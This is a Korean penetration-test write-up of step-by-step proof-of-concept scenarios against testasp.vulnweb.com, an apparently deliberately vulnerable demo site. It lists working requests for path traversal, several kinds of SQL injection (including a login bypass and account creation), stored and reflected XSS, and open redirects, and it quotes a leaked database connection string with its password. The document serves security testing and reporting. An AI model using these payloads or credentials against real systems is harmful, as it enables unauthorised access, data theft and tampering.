# PoC 시나리오 — testphp-vulnweb-test (대상: testasp.vulnweb.com)

`PoC-코드.md` 의 실행 순서/맥락을 단계별로 서술한다. 각 시나리오는 **단독 재현 가능**하며
대부분 인증이 필요 없다. project 누적(phase 1 Round 1~6 + phase 2 Round 7~12) 전체를 반영해
재생성했고, 실증 여부를 단계마다 명시했다.

표기: ✅ 실측 확인 · ⚠️ 조건부(선행 단계 필요) · ⛔ 실행하지 않음(위험/미승인)

---

## 시나리오 A — 인증 없이 임의 파일 읽기 (+ DB 자격증명 탈취) ✅

1. `GET /Templatize.asp?item=html/about.html` → 200 (정상 include 경로 확인).
2. 같은 파라미터에 상대경로를 넣어 파일시스템 상승:
   `GET /Templatize.asp?item=../../../../../../../../windows/win.ini` → **200**,
   본문에 `; for 16-bit app support` · `[fonts]` · `[extensions]` · `MAPI=1`.
3. 같은 방식으로 `windows/system32/drivers/etc/hosts`, `windows/system.ini` 도 200.
4. 경로 해석 규칙(실측): `item` 은 **응용 루트 기준 상대경로**다. 그래서 `../web.config`(부모)는
   500 이고, `html/../web.config`(루트에서 되돌아옴)는 **200 + 설정 파일 전체**.
5. 소스 파일도 열린다: `GET /Templatize.asp?item=db.asp` → 200, **소스 평문**(실행되지 않음).
6. 그 안에서 DB 접속 문자열 확인:
   `Provider=SQLNCLI11;Server=(local)\SQL;Database=acuforum;Uid=acunetix;Pwd=acunetixtrustno1;`
   → **자격증명 탈취**. SQLi 로 얻은 `SYSTEM_USER='acunetix'` 와 교차검증됨.
7. `Login.asp`·`showforum.asp`·`showthread.asp`·`Search.asp`·`Register.asp`·`Logout.asp`·
   `Default.asp`·`logInput.asp`·`web.config` 까지 같은 방법으로 확보(총 11개, 증거 `evidence/source_leak/`).
8. 잔여 확인(전부 음성): `C:\scripts\logInput.txt`, `*.bak`, `global.asa`, `boot.ini`, IIS
   `applicationHost.config`, `inetpub\wwwroot\web.config` → 500.

기대 결과: 인증 없이 서버 파일 읽기 → 소스 유출 → DB 자격증명. 6~11 요청.

---

## 시나리오 B — SQL Injection boolean-blind 로 DB 데이터 추출 ✅

1. `GET /showforum.asp?id=1'` → **500**, `?id=1` → 200 → 따옴표로 구문 오류 유발 가능.
2. 오라클 확립: `?id=1 AND 1=1` → 200, `?id=1 AND 1=2` → **500**.
3. DBMS 판별: `LEN('a')=1` → 200(MSSQL), `LENGTH('a')=1` → 500(MySQL 아님),
   `ISNULL(NULL,'x')='x'` → 200(MSSQL).
4. 길이/문자 오라클(이분탐색): `LEN((DB_NAME()))=8` → 200 … → **`acuforum`**.
5. 카탈로그: `(SELECT name+',' FROM sysobjects WHERE xtype='U' ORDER BY name FOR XML PATH(''))`
   → `forums,posts,threads,users,`.
6. 계정/규모: `SYSTEM_USER` → `acunetix`, `COUNT(*) FROM users` → `1758`(phase 1 시점값).
7. 같은 오라클을 `showthread.asp` 에도: `?id=0 OR 1=1` → 200 + **2,644,469 B**(게시글 1378건, 작성자명 포함).
8. `Search.asp?tfSearch=a'--` → 500, `tfSearch=0 OR 1=1` → 200(+790B).

기대 결과: 3개 엔드포인트 SQLi 확정 + DB 메타데이터 추출. 총 439 요청(자동화).

---

## 시나리오 C — UNION 기반 **페이지 가시** 추출 (가장 빠른 데이터 탈취) ✅

1. `Search.asp` 쿼리 구조를 소스에서 확인:
   `… AND (CHARINDEX(a.title,'<st>')>0 OR CHARINDEX(a.message,'<st>')>0)` — 주입 지점이 **괄호 안**.
2. `0 UNION SELECT …` 형태는 500 (앞의 따옴표·괄호가 닫히지 않음).
3. 괄호를 닫고 나가는 형태로 시도:
   `tfSearch=q')>0) UNION ALL SELECT 1,'ACU-POSTER','ACU-TITLE','ACU-MESSAGE',1,1,GETDATE(),'ACU-AVATAR','ACU-TTITLE','ACU-FORUM'--`
   → 200 + **마커 5개가 페이지에 그대로 렌더**(증거 `evidence/r7/r7_U1_search_union_verify.html`).
4. 같은 요청 패턴으로 `@@version` / `DB_NAME()` / `SUSER_SNAME()` / 테이블 목록 추출:
   `MSSQL 2014 SP3-GDR 12.0.6179.1 X64 Express on Windows NT 6.3 (Build 9600)`.
5. `users` 1건 최소 추출: `uname=netsparker(0x001DFE)` / 평문 `upass` / `email` → **평문 비밀번호 저장** 확인.
6. 교차 DB 열거: `sys.databases` → `master,tempdb,model,msdb,acublog,acuforum,acuservice`
   (테이블/컬럼/행 수까지만 — 값 추출 안 함).

기대 결과: **요청 1개당 임의 데이터 1건이 화면에 출력**(블라인드 439요청 → 수 요청으로 단축).
phase 1 의 "UNION 불가" 결론이 오판이었음을 확정한 시나리오.

---

## 시나리오 D — stacked query 로 임의 T-SQL 실행 ✅

1. `showthread.asp?id=0` 기준선 → 200, 0.35s.
2. `id=0;IF 1=1 WAITFOR DELAY '0:0:04'--` → 200, **8.51s**(같은 id 로 쿼리가 2회 실행되어 2배).
3. `id=0;IF 1=2 WAITFOR DELAY '0:0:04'--` → 200, 0.59s → **차분 성립 = 문장이 실제로 실행됨**.
4. `showforum.asp` 로 반복(3회 실행): 1s→3.37s / 3s→9.52s / 8s→24.35s → 지연값에 비례.
5. `Login.asp` 의 `tfUName` 에서도 성립(인증 전): `x'; WAITFOR DELAY '0:0:04'--` → 200 응답 4.37s.
6. 파생: `IF (SELECT IS_MEMBER('db_datawriter'))=1 WAITFOR …` → 권한 오라클로 전환(쓰기 없이).

⛔ 주의: `id` 를 POST 요청에 주입하면 **애플리케이션 자체 로직이 게시글을 일괄 삭제**한다
(`showforum.asp:29` / `showthread.asp:21` — `total>100` 이면 `DELETE FROM threads/posts`) →
`Exploit-시나리오.md` 경고 절 참고. 이번 project 에서는 POST+주입을 하지 않았다.

---

## 시나리오 E — 로그인 우회 → 인증 전용 기능 접근 ✅

1. 실패 기준선: `POST /Login.asp` (`tfUName=__nosuchuser__&tfUPass=__wrongpw__`) → 200(실패 페이지).
2. 우회: `POST /Login.asp` (`tfUName=admin'--&tfUPass=x`) → **302 Object moved, Location: Default.asp**.
3. 쿠키 jar 유지 후 `GET /Default.asp` → 메뉴가 `logout admin'--` → **인증 세션 획득**.
4. 같은 세션으로 `GET /showthread.asp?id=0` → `<form name="frmPostMessage">` + `<textarea name="tfText">`
   노출 = **쓰기 권한 획득**(비인증 상태에선 없음).
5. 변형 확인: `tfUName=admin'--` ✅ / `tfUPass=' OR '1'='1` ✅ / `tfUName=' OR '1'='1'--` ✅ /
   `tfUName=' OR '1'='1`(주석 없음) ❌ / `tfUName=' OR 1=1--`(리터럴 없음) 500.

---

## 시나리오 F — SQLi 로 **행 생성(임의 DML)** 후 정상 로그인 ✅ (phase 2, 사용자 승인 후)

1. `id=0;IF NOT EXISTS(SELECT 1 FROM users WHERE uname='acu-r7 proof') INSERT INTO users
   (uname,upass,email,realname,avatar) VALUES ('acu-r7 proof','P@ss-r7','r7@example.com','r7','')--`
   → 200.
2. 검증 A: UNION 추출로 `COUNT=1`, `upass=P@ss-r7`, `realname=r7` 확인.
3. 검증 B: **정상 로그인 폼**으로 `acu-r7 proof` / `P@ss-r7` → **302 Location: Default.asp**.
4. `GET /Default.asp` 에 `logout acu-r7 proof` 렌더 → 애플리케이션이 이 계정을 실제 계정으로 취급.
5. 흔적: users 행 +1 (453→454, 당시). 이후 06:15 UTC 일일 초기화로 사라짐(증거는 캡처로 보존).

의미: **읽기 전용 SQLi 가 "계정 생성"까지** 확장된다 — 기존 계정의 비밀번호를 바꾸는 UPDATE 도
같은 권한으로 가능하지만(권한 오라클 true) **실행하지 않았다**(기존 행 변경 금지 원칙).

---

## 시나리오 G — `/Register.asp` INSERT SQLi (계정 생성 경로 자체의 주입) ✅ (phase 2, 승인 후)

1. 정상 등록이 `avatar` 를 항상 `''` 로 넣는다는 것을 소스(`Register.asp:38`)에서 확인 → **avatar 조작 = 주입 증명**.
2. `POST /Register.asp` 에 `tfUName=acu-r9-reg','RegR9!','r9@example.com','r9','INJECTED') ;
   IF 1=1 WAITFOR DELAY '0:0:04'--` → **302 + 4.35초**(뒤 문장까지 실행 = **stacked 성립**).
3. UNION 검증: `SELECT avatar FROM users WHERE uname='acu-r9-reg'` → **`'INJECTED'`**
   (정상 경로로는 절대 나올 수 없는 값).
4. 정상 로그인 `acu-r9-reg` / `RegR9!` → 302 `Default.asp` → 계정이 실제로 생성·사용 가능.

---

## 시나리오 H — second-order SQLi (세션 사용자명 → `posts.poster`) ✅ / 임팩트는 조건부 ⚠️

1. 우회 로그인으로 세션에 따옴표 포함 사용자명을 심는다: `tfUName=x' OR 1=1--` → 302.
2. 그 세션으로 답글 POST: `POST /showthread.asp?id=0` (`tfSubject=…&tfText=…`) → **500**.
3. 대조군: 정상 계정(R8 에서 만든 계정)으로 같은 POST → **200 + 게시글 생성**.
4. 해석: `showthread.asp:60` 이 `poster` 만 이스케이프하지 않아(=`Session("uname")` 무이스케이프)
   **다른 문장을 깨뜨린다** — second-order 는 확정. 단 **데이터 주입은 불가**: 로그인이 성립하는
   문자열(`WHERE uname='…'`)은 `VALUES (…)` 에서 반드시 구문 오류가 되어 두 제약이 상호 배타적.
   실제 임팩트 = **그 세션의 게시 기능 파괴(500)**.

---

## 시나리오 I — Stored XSS (답글 1건) ✅ (phase 2, 재승인 후 실증)

1. 필터 확인(소스): `If InStr(1, Request.Form("tfText"), "<a href=") > 0 then Response.End` — **하나뿐**.
2. 게시: `POST /showthread.asp?id=0` (`tfSubject=acuredteam-r8-xss-proof`,
   `tfText=<img src=x onerror=alert(document.domain)>`) → 200.
3. `GET /showthread.asp?id=0` → 본문에 `<div class='posttext'><img src=x onerror=alert(document.domain)></div>`
   **무인코딩** 렌더.
4. 쿠키 없는 비인증 요청으로 반복 → **동일하게 렌더** = 그 스레드를 여는 모든 방문자에서 실행.
5. 응답 헤더에 **CSP 없음** → 인라인 핸들러 차단 요소 없음.
6. 흔적: posts +1 (21→22, 당시). 일일 초기화로 사라짐(증거 `evidence/r8/r8_thread_after_post.html`).

phase 1 에서는 쓰기 미승인으로 **미실증**이었고, phase 2 재승인 후 실증됐다.

---

## 시나리오 J — Reflected XSS / 세션 사용자명 XSS ✅

1. `GET /Search.asp?tfSearch=<script>alert(1)</script>` → 본문에
   `You searched for '<script>alert(1)</script>'` **이스케이프 없이** 포함(`"` `>` 도 그대로).
2. 로그인 폼에 사용자명으로 `<img src=x onerror=alert(document.domain)>' OR '1'='1'--` 를 넣어
   (SQLi 우회 + XSS 동시 성립) 로그인 → `GET /Default.asp` 응답에 `logout <img …>` 무인코딩 출력.
3. 쓰기 없이 성립하며, 값이 세션에 저장되므로 **모든 페이지** 메뉴에서 반사된다.

---

## 시나리오 K — Open Redirect (3개 경로) ✅ / 경로별 조건 ⚠️

1. `Login.asp`: 리다이렉트는 **로그인 성공 시에만** 실행된다 → 시나리오 E 와 결합:
   `POST /Login.asp?RetURL=http://example.com/` + `tfUName=admin'--&tfUPass=x` → `302 Location: http://example.com/`.
2. `Logout.asp`: 인증 불요 — `GET /Logout.asp?RetURL=http://example.com/` → 302 외부.
3. `Register.asp`: 소스상 동일 패턴(`Response.Redirect(Request.QueryString("RetURL"))`).
4. `RetURL=//example.com/`(프로토콜 상대 URL)도 그대로 통과.
5. CRLF 헤더 인젝션은 불가(ASP 가 `%0D%0A` 로 인코딩) — 음성 확인.

---

## 시나리오 L — 세션/전송 계층 (설정 결함) ✅

1. `GET /Default.asp` 응답 헤더: `Set-Cookie: ASPSESSIONIDCCCTQDSA=<32hex>; path=/`
   → **HttpOnly·Secure·SameSite 전부 없음**, domain 미지정.
2. 로그인 POST 응답에 `Set-Cookie` 없음 → **인증 시 세션 ID 미회전**(session fixation 조건).
3. `Logout.asp` 는 `Session.Contents.Remove("uname")` 만 — 세션 자체는 유지.
4. `https://testasp.vulnweb.com/` → 443 타임아웃(HTTPS 미제공) → 쿠키가 평문 전송.
5. 보안 헤더 6종(CSP/XFO/XCTO/HSTS/Referrer-Policy/Permissions-Policy) 전무.
6. `OPTIONS` → `Allow: OPTIONS, TRACE, GET, HEAD, POST`(PUT/DELETE 없음), `TRACE` → 501,
   IIS 8.3 단축명 404.

→ 시나리오 I/J 의 XSS 와 결합하면 `document.cookie` 로 세션 탈취가 가능한 구성(탈취 실행은 안 함).

---

## 시나리오 M — RCE 시도와 결론 ⛔/✅(음성)

1. `PUT /r10probe.txt` → **404**(파일 미생성) / `Allow` 에 PUT 없음 → 웹셸 업로드 경로 없음.
2. DB 측: `IS_SRVROLEMEMBER('sysadmin')`=false, `db_owner`=false, `xp_cmdshell`·Ole Automation
   `value_in_use=0`, `bulkadmin`/`BULK OPERATIONS`=false, `ALTER`/`CONTROL`=false
   → **OS 명령 실행 불가**(근거 5개).
3. traversal 로 `logInput.asp` 의 파일 쓰기 함수(`WriteToFile`, 경로 `C:\scripts\logInput.txt`)는
   존재하지만 **호출부가 주석 처리**되어 있고 공격자 입력으로 호출되는 경로는 없음 → 파일 쓰기 프리미티브 미확보.

결론: 이 project 의 임팩트 상한은 **DB 전체 읽기 + 임의 DML(쓰기) + 앱 계정 생성/탈취 + 전 방문자 XSS**.
